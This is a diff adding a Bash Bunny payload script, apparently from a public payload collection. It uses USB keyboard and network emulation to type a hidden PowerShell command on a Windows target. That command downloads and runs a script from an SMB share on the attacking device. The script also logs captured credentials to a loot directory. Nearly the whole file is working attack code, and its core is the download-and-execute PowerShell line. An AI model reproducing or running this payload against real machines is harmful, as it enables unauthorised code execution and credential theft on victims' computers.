@@ -1,0 +1,77 @@
+#!/bin/bash
+#
+# Title:         Powershell Download and Execute SMB
+# Author:        LowValueTarget
+# Version:       1.2
+# Category:      Powershell
+# Target:        Windows XP SP3+ (Powershell)
+# Attackmodes:   HID, RNDIS_ETHERNET
+# Firmware:      >= 1.2
+#
+# Quick HID attack to retrieve and run powershell payload from BashBunny SMBServer. Credentials are stored as loot.  
+# Ensure psh.txt exists in payload directory  
+#
+# Requires Impacket is installed (python ./impacket/setup.py install)  
+#
+# | Attack Stage        | Description                   |
+# | ------------------- | ------------------------------|
+# | Stage 1             | Powershell                    |
+# | Stage 2             | Delivering powershell payload |
+#
+
+ATTACKMODE RNDIS_ETHERNET HID
+
+# SETUP
+LED SETUP
+REQUIRETOOL impacket # required for SMB server
+
+GET SWITCH_POSITION
+GET TARGET_HOSTNAME
+GET HOST_IP
+
+PAYLOAD_DIR=/root/udisk/payloads/$SWITCH_POSITION
+# Check for psh.txt
+if [ ! -f ${PAYLOAD_DIR}/psh.txt ]; then
+    LED FAIL
+    exit 1
+fi
+cp -R ${PAYLOAD_DIR}/* /tmp/
+
+LOOTDIR=/root/udisk/loot/psh_DownloadExecSMB
+# Setup named logs in loot directory
+mkdir -p ${LOOTDIR}
+HOST=${TARGET_HOSTNAME}
+# If hostname is blank set it to "noname"
+[[ -z "$HOST" ]] && HOST="noname"
+COUNT=$(ls -lad ${LOOTDIR}/$HOST* | wc -l)
+COUNT=$((COUNT+1))
+mkdir -p ${LOOTDIR}/${HOST}-$COUNT
+
+# Log file
+LOGFILE=psh_smb.log
+
+# Start SMB Server
+mkdir -p /loot
+python /tools/impacket/examples/smbserver.py -comment 'Public Share' s /tmp/ > /loot/${LOGFILE} &
+
+# STAGE 1 - Powershell
+LED STAGE1
+
+RUN WIN "powershell -WindowStyle Hidden \"while (\$true) { If ((New-Object net.sockets.tcpclient ($HOST_IP,445)).Connected) { iex (New-Object Net.WebClient).DownloadString('\\\\$HOST_IP\\s\\psh.txt');New-Item \\\172.16.64.1\\s\\COMPLETE -ItemType file;exit}}\""
+# Remove tracks in the psh payload if you wish
+
+# STAGE 2 - Wait until payload retrieved
+# Wait until payload is retrieved
+LED STAGE2
+while ! [ -f /tmp/COMPLETE ]; do sleep 0.5; done
+
+# CLEANUP
+LED CLEANUP
+
+# Move loot to mass storage
+mv /loot/${LOGFILE} ${LOOTDIR}/${HOST}-$COUNT
+rm /loot/${LOGFILE}
+# Sync file system
+sync
+
+LED FINISH
